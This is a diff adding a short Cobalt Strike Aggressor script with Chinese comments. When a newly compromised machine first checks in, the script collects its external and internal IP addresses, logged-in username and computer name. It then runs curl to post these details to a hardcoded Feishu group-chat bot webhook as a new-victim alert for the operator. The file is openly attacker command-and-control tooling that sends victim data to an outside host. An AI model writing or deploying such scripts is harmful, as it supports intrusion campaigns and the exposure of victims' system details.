@@ -1,0 +1,20 @@
+on beacon_initial {
+    # 飞书群聊机器人 webhook 地址
+    $feishu_url = 'https://open.feishu.cn/open-apis/bot/v2/hook/092e2219-726f-4202-876a-cc6ac8641490';
+    
+    #获取ip、计算机名、登录账号
+    $externalIP = replace(beacon_info($1, "external"), " ", "_");
+    $internalIP = replace(beacon_info($1, "internal"), " ", "_");
+    $userName = replace(beacon_info($1, "user"), " ", "_");
+    $computerName = replace(beacon_info($1, "computer"), " ", "_");
+
+    # json格式的消息体
+    $json_start = "{\"msg_type\":\"text\",\"content\":{\"text\": ";
+    $json_msg = '"Cobalt Strike上线提醒\nexternal: '.$externalIP.'\ninternal: '.$internalIP.'\n用户名: '.$userName.'\n计算机名: '.$computerName.'\n"';
+    $json_end = "}}";
+    $msg = $json_start.$json_msg.$json_end;
+
+    # 调用飞书API
+    @curl_command = @('curl','-X','POST','-H','Content-Type: application/json','-d',$msg,$feishu_url);
+    exec(@curl_command);
+}
